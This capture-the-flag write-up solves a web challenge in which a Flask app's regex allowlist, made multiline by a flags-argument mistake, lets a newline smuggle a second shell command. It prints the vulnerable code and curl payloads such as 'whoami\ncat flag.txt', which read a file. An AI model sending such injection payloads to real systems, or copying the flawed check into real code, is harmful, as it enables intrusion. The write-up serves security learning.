## Chall description
```
Category: Web

The Arika ransomware group likes to look slick and spiffy with their cool green-on-black terminal style website... but it sounds like they are worried about some security concerns of their own!

The password for the ZIP archive below is arika.
```

## Procedure
**arika.zip content:**
```
tree .
.
├── Dockerfile
├── app.py
├── commands
│   ├── contact.sh
│   ├── help.sh
│   ├── hostname.sh
│   ├── leaks.sh
│   ├── news.sh
│   └── whoami.sh
├── flag.txt
├── requirements.txt
├── static
│   ├── style.css
│   └── terminal.js
└── templates
    └── index.html

4 directories, 13 files
```

Starting reading the `app.py` file content:
```python
import os, re
import subprocess
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

ALLOWLIST = ["leaks", "news", "contact", "help",
             "whoami", "date", "hostname", "clear"]

def run(cmd):
    try:
        proc = subprocess.run(["/bin/sh", "-c", cmd],capture_output=True,text=True,check=False)
        return proc.stdout, proc.stderr, proc.returncode
    except Exception as e:
        return "", f"error: {e}\n", 1

@app.get("/")
def index():
    return render_template("index.html")

@app.post("/")
def exec_command():
    data = request.get_json(silent=True) or {}
    command = data.get("command") or ""
    command = command.strip()
    if not command:
        return jsonify(ok=True, stdout="", stderr="", code=0)
    if command == "clear":
        return jsonify(ok=True, stdout="", stderr="", code=0, clear=True)
    if not any([ re.match(r"^%s$" % allowed, command, len(ALLOWLIST)) for allowed in ALLOWLIST]):
        return jsonify(ok=False, stdout="", stderr="error: Run 'help' to see valid commands.\n", code=2)
    
    stdout, stderr, code = run(command)
    return jsonify(ok=(code == 0), stdout=stdout, stderr=stderr, code=code)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
```
**app.py content**:
* Defines an ALLOWLIST of allowed command tokens `leaks, news, contact, help, whoami, date, hostname, clear`.
* Implements `run(cmd)` which executes cmd through a shell `/bin/sh -c cmd` using `subprocess.run`, and return code.
* Exposes `POST /` route that expects JSON body and reads the `command` field.
* Checks if command matches any entry in `ALLOWLIST` using a `regex` loop: `any(re.match("^%s$" % allowed, command, len(ALLOWLIST)) for allowed in ALLOWLIST)`.

<img width="1013" height="634" alt="Screenshot 2025-10-04 at 9 29 43 AM" src="https://github.com/user-attachments/assets/0616fa38-dffb-4db3-80e3-0288b9056592" />

After read the `app.py` file,  I can see a regex bug into `any([ re.match(r"^%s$" % allowed, command, len(ALLOWLIST)) for allowed in ALLOWLIST])` . Multiline input can bypass that regx filter, the idea was sent `whoami\nls` with `curl`.

```bash
curl -X POST "http://localhost:5000/" -H "Content-Type: application/json" -d '{"command":"whoami\nls"}'

# output
{"code":0,"ok":true,"stderr":"","stdout":"guest\napp.py\ncommands\nDockerfile\nflag.txt\nrequirements.txt\nstatic\ntemplates\n"}
```

That's work, so I sent the payload `whoami\ncat flag.txt` to recover the flag.
```bash
curl -X POST "https://<remote_ip>/" -H "Content-Type: application/json" -d '{"command":"whoami\ncat flag.txt"}'

# output
{"code":0,"ok":true,"stderr":"","stdout":"guest\nflag{eaec346846596f7976da7e1adb1f326d}\n"}
```

Flag `flag{eaec346846596f7976da7e1adb1f326d}`
